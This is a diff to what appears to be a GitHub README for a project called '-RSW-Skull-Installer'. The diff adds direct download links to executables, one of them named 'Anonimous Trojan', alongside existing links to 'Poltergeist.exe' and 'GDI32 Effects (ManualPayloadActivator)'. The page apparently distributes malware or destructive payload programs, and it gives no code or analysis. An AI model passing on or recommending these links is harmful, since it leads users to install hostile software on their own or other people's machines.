@@ -14,7 +14,7 @@
 
 [JigTYY (OUTDATED)](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/13/JigTYY.exe).
 
-[Katiuscia.exe](https://COMING-SOON).
+[Katiuscia.exe](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/500/Katiuscia.exe).
 
 [GDI32 Effects (ManualPayloadActivator)](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1455612/GDI32.Effect.exe).
 
@@ -22,7 +22,7 @@
 
 [Poltergeist.exe](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1455612/Poltergeist.exe).
 
-[COMING SOON](https://COMING-SOON).
+[Anonimous Trojan](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/3456646/AnonimousTrojan.exe).
 
 [COMING SOON](https://COMING-SOON).
 
@@ -32,6 +32,6 @@
 
 ### Other info
 ```markdown
-I am a developer, I know very good C# and VBasic
+I am a developer, I know batch, vbasic, C#, C++
 ```
 
